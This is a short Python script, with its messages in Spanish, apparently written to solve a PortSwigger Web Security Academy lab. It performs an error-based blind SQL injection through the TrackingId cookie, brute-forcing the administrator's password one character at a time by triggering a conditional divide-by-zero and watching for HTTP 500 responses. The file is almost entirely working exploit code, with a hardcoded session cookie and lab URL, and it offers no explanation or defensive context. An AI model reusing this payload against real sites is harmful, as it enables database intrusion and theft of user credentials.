from termcolor import colored
import requests
import sys
import signal
import string
import time

def def_handler(sig, frame):
    print(colored("\n\n[!] Saliendo...\n", 'red'))
    print("Ataque de fuerza bruta detenido")
    sys.exit(1)

# Ctrl+C
signal.signal(signal.SIGINT, def_handler)

characters = string.ascii_lowercase + string.digits

def makeSQLi():

    print("Iniciando ataque de fuerza bruta")
    time.sleep(2)

    password = ""

    for position in range(1, 21):
        for character in characters:
             cookies = {
                'TrackingId': f"vYh5h3DJPcqlMNL1'||(select case when substr(password,{position},1)='{character}' then to_char(1/0) else '' end from users where username='administrator')||'",
                'session': 'rmNhYOrY6qe7FFJ9NgLIZ2QXyhjO2iuW'
            }

             r = requests.get("https://0aef00a70390500680f1f9e700200044.web-security-academy.net", cookies=cookies)


             if r.status_code == 500:
                password += character
                print({password})
                break

if __name__ == '__main__':
    makeSQLi()
